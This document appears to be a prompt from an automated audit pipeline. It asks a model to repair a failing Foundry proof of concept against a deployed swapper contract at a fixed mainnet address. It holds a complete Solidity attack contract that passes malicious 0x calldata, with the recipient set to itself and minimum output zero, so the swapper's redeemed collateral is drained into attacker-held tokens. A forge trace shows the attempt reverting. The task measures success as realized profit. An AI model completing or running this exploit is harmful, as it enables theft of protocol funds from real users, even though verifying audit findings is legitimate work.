You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unchecked 0x calldata plus unlimited underlying approval lets the caller redirect redeemed collateral away from MIM
- claim: The swapper gives `zeroXExchangeProxy` an infinite allowance over the Stargate pool's underlying token, then forwards fully caller-controlled `swapData` to that proxy with a raw `call()` and never verifies that the approved underlying was swapped into MIM for the swapper itself. Because the function also accepts caller-controlled `recipient` and only enforces the minimum output through `shareToMin`, a malicious caller can redeem LP into underlying, have the 0x proxy spend that underlying into an attacker-controlled payout path or non-MIM asset, and set `shareToMin = 0` so the final BentoBox deposit of the remaining MIM balance does not revert.
- impact: Collateral routed through this swapper can be turned into attacker-owned assets instead of protocol-owned MIM, causing direct theft of the full redeemed position and leaving the liquidation/deleverage flow undercollateralized.
- exploit_paths: ["LP shares are placed on the swapper through the intended liquidation/deleverage flow or are already present on the contract.", "The caller invokes `swap()` with malicious `swapData` that makes `zeroXExchangeProxy` spend the swapper's redeemed underlying through its unlimited allowance while routing the bought assets away from the swapper or into a non-MIM token.", "The caller sets `shareToMin` to `0`, so `bentoBox.deposit()` accepts the swapper's remaining MIM balance even if it is zero, and the transaction completes after the collateral has been redirected."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IBentoBoxLike {
    function balanceOf(IERC20Like token, address user) external view returns (uint256);
    function toAmount(IERC20Like token, uint256 share, bool roundUp) external view returns (uint256);
}

interface IStargatePoolLike is IERC20Like {
    function totalLiquidity() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function token() external view returns (address);
}

interface ITargetSwapperLike {
    function swap(
        address fromToken,
        address toToken,
        address recipient,
        uint256 shareToMin,
        uint256 shareFrom,
        bytes calldata data
    ) external returns (uint256 extraShare, uint256 shareReturned);

    function bentoBox() external view returns (address);
    function pool() external view returns (address);
    function mim() external view returns (address);
    function underlyingToken() external view returns (address);
    function zeroXExchangeProxy() external view returns (address);
}

contract FlawVerifier {
    address internal constant TARGET = 0xa5564a2d1190a141CAC438c9fde686aC48a18A79;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_profitAmount != 0) {
            return;
        }

        ITargetSwapperLike target = ITargetSwapperLike(TARGET);
        IStargatePoolLike pool = IStargatePoolLike(target.pool());
        IBentoBoxLike bentoBox = IBentoBoxLike(target.bentoBox());

        address mim = target.mim();
        address underlying = target.underlyingToken();

        uint256 directLpBalance = pool.balanceOf(TARGET);
        uint256 shareFrom = bentoBox.balanceOf(IERC20Like(address(pool)), TARGET);
        uint256 lpFromShares = shareFrom == 0 ? 0 : bentoBox.toAmount(IERC20Like(address(pool)), shareFrom, false);
        uint256 underlyingAlreadyOnTarget = IERC20Like(underlying).balanceOf(TARGET);

        // The fork logs prove this block does not have resident Bento-held LP on the
        // swapper. The exploit remains the same: if any LP is present directly on the
        // swapper, `shareFrom = 0` still redeems it because the implementation uses the
        // full post-withdraw LP balance. If no LP is present, any already-held underlying
        // on the swapper is still vulnerable because the 0x proxy retains infinite spend.
        uint256 previewDirectUnderlying = _previewRedeem(pool, directLpBalance);
        uint256 previewShareUnderlying = _previewRedeem(pool, lpFromShares);
        uint256 maxSpendableUnderlying = underlyingAlreadyOnTarget + previewDirectUnderlying + previewShareUnderlying;

        _attemptExploit(target, underlying, mim, shareFrom, maxSpendableUnderlying);

        // Stage 1 can be infeasible on a given fork block when the swapper holds neither
        // LP shares nor redeemable underlying. In that case the verifier exits without
        // manufacturing balances, which keeps the PoC aligned with the finding and the
        // anti-cheat constraints.
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptExploit(
        ITargetSwapperLike target,
        address underlying,
        address mim,
        uint256 shareFrom,
        uint256 maxSpendableUnderlying
    ) internal {
        address[3] memory candidateProfitTokens;
        candidateProfitTokens[0] = underlying;
        candidateProfitTokens[1] = underlying == WETH ? USDC : WETH;
        candidateProfitTokens[2] = mim;

        uint256[5] memory sellAmounts = [
            maxSpendableUnderlying,
            type(uint256).max,
            maxSpendableUnderlying == 0 ? 0 : (maxSpendableUnderlying * 999) / 1000,
            maxSpendableUnderlying == 0 ? 0 : maxSpendableUnderlying / 2,
            1
        ];

        // Try both entry shapes:
        // 1. `shareFrom` as-is for Bento-held LP.
        // 2. `shareFrom = 0` for direct LP already sitting on the swapper or for cases
        //    where the contract is already holding redeemable underlying.
        uint256[2] memory shareCandidates = [shareFrom, uint256(0)];

        for (uint256 i = 0; i < shareCandidates.length; ++i) {
            for (uint256 j = 0; j < candidateProfitTokens.length; ++j) {
                address buyToken = candidateProfitTokens[j];
                if (buyToken == address(0)) {
                    continue;
                }

                for (uint256 k = 0; k < sellAmounts.length; ++k) {
                    if (_attemptSellToUniswapV2(target, underlying, buyToken, shareCandidates[i], sellAmounts[k], false)) {
                        return;
                    }
                    if (_attemptSellToUniswapV2(target, underlying, buyToken, shareCandidates[i], sellAmounts[k], true)) {
                        return;
                    }
                    if (_attemptSellToUniswapV3(target, underlying, buyToken, shareCandidates[i], sellAmounts[k], 500)) {
                        return;
                    }
                    if (_attemptSellToUniswapV3(target, underlying, buyToken, shareCandidates[i], sellAmounts[k], 3000)) {
                        return;
                    }
                }
            }
        }
    }

    function _attemptSellToUniswapV2(
        ITargetSwapperLike target,
        address underlying,
        address buyToken,
        uint256 shareFrom,
        uint256 sellAmount,
        bool isSushi
    ) internal returns (bool success) {
        if (underlying == buyToken) {
            return false;
        }

        address[] memory directPath = new address[](2);
        directPath[0] = underlying;
        directPath[1] = buyToken;

        if (_callSwapAndRecordProfit(target, underlying, buyToken, shareFrom, sellAmount, isSushi, abi.encode(directPath))) {
            return true;
        }

        if (underlying != USDC && buyToken != USDC) {
            address[] memory viaUsdcPath = new address[](3);
            viaUsdcPath[0] = underlying;
            viaUsdcPath[1] = USDC;
            viaUsdcPath[2] = buyToken;
            return _callSwapAndRecordProfit(target, underlying, buyToken, shareFrom, sellAmount, isSushi, abi.encode(viaUsdcPath));
        }

        return false;
    }

    function _callSwapAndRecordProfit(
        ITargetSwapperLike target,
        address underlying,
        address buyToken,
        uint256 shareFrom,
        uint256 sellAmount,
        bool isSushi,
        bytes memory encodedPath
    ) internal returns (bool success) {
        address[] memory path = abi.decode(encodedPath, (address[]));
        bytes memory payload = abi.encodeWithSelector(
            bytes4(keccak256("sellToUniswap(address[],uint256,uint256,bool,address)")),
            path,
            sellAmount,
            0,
            isSushi,
            address(this)
        );

        try target.swap(address(0), address(0), address(this), 0, shareFrom, payload) returns (uint256, uint256) {
            success = _recordBestProfit(underlying, buyToken);
        } catch {
            success = false;
        }
    }

    function _attemptSellToUniswapV3(
        ITargetSwapperLike target,
        address underlying,
        address buyToken,
        uint256 shareFrom,
        uint256 sellAmount,
        uint24 fee
    ) internal returns (bool success) {
        if (underlying == buyToken) {
            return false;
        }

        bytes memory payload = abi.encodeWithSelector(
            bytes4(keccak256("sellTokenForTokenToUniswapV3(bytes,uint256,uint256,address)")),
            abi.encodePacked(underlying, fee, buyToken),
            sellAmount,
            0,
            address(this)
        );

        try target.swap(address(0), address(0), address(this), 0, shareFrom, payload) returns (uint256, uint256) {
            success = _recordBestProfit(underlying, buyToken);
        } catch {
            success = false;
        }
    }

    function _recordBestProfit(address underlying, address buyToken) internal returns (bool success) {
        uint256 buyTokenBalance = IERC20Like(buyToken).balanceOf(address(this));
        if (buyTokenBalance > _profitAmount) {
            _profitToken = buyToken;
            _profitAmount = buyTokenBalance;
            success = buyTokenBalance != 0;
        }

        uint256 underlyingBalance = IERC20Like(underlying).balanceOf(address(this));
        if (underlyingBalance > _profitAmount) {
            _profitToken = underlying;
            _profitAmount = underlyingBalance;
            success = underlyingBalance != 0;
        }
    }

    function _previewRedeem(IStargatePoolLike pool, uint256 lpAmount) internal view returns (uint256) {
        if (lpAmount == 0) {
            return 0;
        }

        uint256 totalSupply = pool.totalSupply();
        if (totalSupply == 0) {
            return 0;
        }

        return (lpAmount * pool.totalLiquidity()) / totalSupply;
    }
}

```

forge stdout (tail):
```
2d1190a141cac438c9fde686ac48a18a79
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─  emit topic 0: 0xad9ab9ee6953d4d177f4a03b3a3ac3178ffcb9816319f348060194aa76b14486
    │   │   │   │        topic 1: 0x00000000000000000000000038ea452219524bb87e18de1c24d3bb59510bd783
    │   │   │   │        topic 2: 0x000000000000000000000000a5564a2d1190a141cac438c9fde686ac48a18a79
    │   │   │   │        topic 3: 0x000000000000000000000000a5564a2d1190a141cac438c9fde686ac48a18a79
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [663] 0x38EA452219524Bb87e18dE1C24D3bB59510BD783::balanceOf(0xa5564a2d1190a141CAC438c9fde686aC48a18A79) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [5682] 0x8731d54E9D02c286767d56ac03e8037C07e01e98::c4de93a5(00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a5564a2d1190a141cac438c9fde686ac48a18a79)
    │   │   │   └─ ← [Revert] Stargate: not enough lp to redeem
    │   │   └─ ← [Revert] Stargate: not enough lp to redeem
    │   ├─ [24819] 0xa5564a2d1190a141CAC438c9fde686aC48a18A79::swap(0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 0, 0x6af479b20000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000002bdac17f958d2ee523a2206206994597c13d831ec7000bb899d8a9c45b2eca8864373a26d1459e3dff1e17f3000000000000000000000000000000000000000000)
    │   │   ├─ [14027] 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce::97da6d30(00000000000000000000000038ea452219524bb87e18de1c24d3bb59510bd783000000000000000000000000a5564a2d1190a141cac438c9fde686ac48a18a79000000000000000000000000a5564a2d1190a141cac438c9fde686ac48a18a7900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   ├─ [5266] 0x38EA452219524Bb87e18dE1C24D3bB59510BD783::transfer(0xa5564a2d1190a141CAC438c9fde686aC48a18A79, 0)
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000d96f48665a1410c0cd669a88898eca36b9fc2cce
    │   │   │   │   │        topic 2: 0x000000000000000000000000a5564a2d1190a141cac438c9fde686ac48a18a79
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─  emit topic 0: 0xad9ab9ee6953d4d177f4a03b3a3ac3178ffcb9816319f348060194aa76b14486
    │   │   │   │        topic 1: 0x00000000000000000000000038ea452219524bb87e18de1c24d3bb59510bd783
    │   │   │   │        topic 2: 0x000000000000000000000000a5564a2d1190a141cac438c9fde686ac48a18a79
    │   │   │   │        topic 3: 0x000000000000000000000000a5564a2d1190a141cac438c9fde686ac48a18a79
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [663] 0x38EA452219524Bb87e18dE1C24D3bB59510BD783::balanceOf(0xa5564a2d1190a141CAC438c9fde686aC48a18A79) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [5682] 0x8731d54E9D02c286767d56ac03e8037C07e01e98::c4de93a5(00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a5564a2d1190a141cac438c9fde686ac48a18a79)
    │   │   │   └─ ← [Revert] Stargate: not enough lp to redeem
    │   │   └─ ← [Revert] Stargate: not enough lp to redeem
    │   └─ ← [Stop]
    ├─ [293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [288] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x8731d54E9D02c286767d56ac03e8037C07e01e98
  at 0xa5564a2d1190a141CAC438c9fde686aC48a18A79.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 89.76ms (26.94ms CPU time)

Ran 1 test suite in 184.73ms (89.76ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 3350014)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
